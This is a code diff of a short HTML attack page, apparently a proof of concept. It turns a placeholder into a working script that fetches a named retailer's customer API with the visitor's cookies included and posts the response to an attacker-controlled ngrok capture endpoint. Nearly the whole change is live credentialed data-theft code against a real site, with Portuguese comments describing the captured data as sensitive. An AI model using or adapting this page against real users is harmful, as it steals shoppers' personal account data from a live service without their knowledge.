@@ -4,14 +4,21 @@
     <form id="evilForm" method="POST" action="https://6574-2804-4580-1080-7db-f323-d027-7f53-d143.ngrok-free.app/capture">
         <input type="hidden" name="data">
     </form>
+
     <script>
-        // Redirecionar para o endpoint e capturar os dados
-        window.location.href = "https://www.boozt.com/at/de-at/api/customer";
-        
-        // Simular captura (na prática, o atacante configuraria um servidor pra pegar os dados manualmente)
-        // Aqui vamos apenas enviar um placeholder pro Ngrok como prova de conceito
-        document.querySelector("input[name=data]").value = "Dados capturados manualmente pelo atacante após redirecionamento";
-        document.getElementById("evilForm").submit();
+        fetch("https://www.boozt.com/at/de-at/api/customer", {
+            credentials: "include"
+        })
+        .then(response => response.text())
+        .then(data => {
+            // Preenche o campo do formulário com os dados sensíveis
+            document.querySelector("input[name=data]").value = data;
+            // Envia para o servidor Go
+            document.getElementById("evilForm").submit();
+        })
+        .catch(err => {
+            console.error("Erro ao buscar dados da Boozt:", err);
+        });
     </script>
 </body>
 </html>
